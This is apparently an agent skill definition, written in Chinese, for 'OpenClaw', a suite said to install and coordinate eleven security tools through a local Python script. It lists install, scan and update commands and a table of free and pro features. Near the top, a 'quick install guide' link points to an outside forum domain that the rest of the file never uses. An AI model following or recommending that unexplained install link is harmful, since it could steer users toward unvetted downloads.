---
name: openclaw-security
description: "统一的安全套件，专为代理工作空间设计。通过一个命令即可完成所有11种OpenClaw安全工具的安装、配置和协调工作，这些工具涵盖：数据完整性保护、密钥管理、权限控制、网络安全、审计追踪、签名验证、供应链安全、凭证管理、注入攻击防御、合规性检查以及事件响应等功能。"
user-invocable: true
metadata: {"openclaw":{"emoji":"🔒","requires":{"bins":["python3"]},"os":["darwin","linux","win32"]}}
---

# OpenClaw 安全套件  
⏹ 快速安装指南：https://openclawcli.forum  

OpenClaw 是一个用于安装、配置和协调整个安全工具栈的工具。  

## 安装所有安全工具  
```bash
python3 {baseDir}/scripts/security.py install --workspace /path/to/workspace
```  
通过 ClawHub 安装全部 11 个免费的安全工具。  

## 统一控制面板  
```bash
python3 {baseDir}/scripts/security.py status --workspace /path/to/workspace
```  
提供所有已安装安全工具的统一状态检查功能。  

## 全面安全扫描  
```bash
python3 {baseDir}/scripts/security.py scan --workspace /path/to/workspace
```  
运行所有安全扫描工具：完整性验证、秘密信息检测、权限审计、网络数据泄露防护（DLP）、供应链分析、注入攻击检测、凭证泄露检测以及合规性审计。  

## 首次设置  
```bash
python3 {baseDir}/scripts/security.py setup --workspace /path/to/workspace
```  
初始化所有需要初始化的工具：完整性基线、工具签名机制、审计日志以及合规性策略。  

## 更新所有工具  
```bash
python3 {baseDir}/scripts/security.py update --workspace /path/to/workspace
```  
通过 ClawHub 将所有已安装的安全工具更新至最新版本。  

## 查看已安装工具  
```bash
python3 {baseDir}/scripts/security.py list --workspace /path/to/workspace
```  
显示已安装的安全工具及其版本信息。  

## 专业级防护扫描  
```bash
python3 {baseDir}/scripts/security.py protect --workspace /path/to/workspace
```  
针对所有已安装的专业级安全工具运行自动化防护措施（需使用专业级版本）。  

## 被协调管理的工具  
| 工具        | 功能领域        | 免费版 | 专业版 |
|------------|--------------|--------|---------|
| **warden**     | 工作区完整性检测、注入攻击检测 | 支持检测 | 提供恢复、回滚、隔离功能 |
| **sentry**     | 秘密信息/凭证扫描     | 支持检测 | 提供删除、隔离功能 |
| **arbiter**     | 权限审计        | 支持检测 | 提供撤销、强制执行功能 |
| **egress**     | 网络数据泄露防护     | 支持检测 | 提供阻止、白名单功能 |
| **ledger**     | 哈希链审计日志      | 支持记录 | 提供冻结、取证功能 |
| **signet**     | 加密工具签名      | 支持验证 | 提供拒绝、恢复功能 |
| **sentinel**     | 供应链安全扫描     | 支持扫描 | 提供隔离、阻止功能 |
| **vault**     | 凭证生命周期管理   | 支持审计 | 提供修复、轮换功能 |
| **bastion**     | 强制注入攻击防御   | 支持扫描 | 提供清理、强制执行功能 |
| **marshal**     | 合规性/策略执行     | 支持审计 | 提供强制执行、挂钩功能 |
| **triage**     | 事件响应与取证     | 支持调查 | 提供遏制、修复功能 |

## 系统要求  
- Python 3.8 或更高版本  
- 无外部依赖（仅依赖标准库）  
- 支持跨平台运行：Windows、macOS、Linux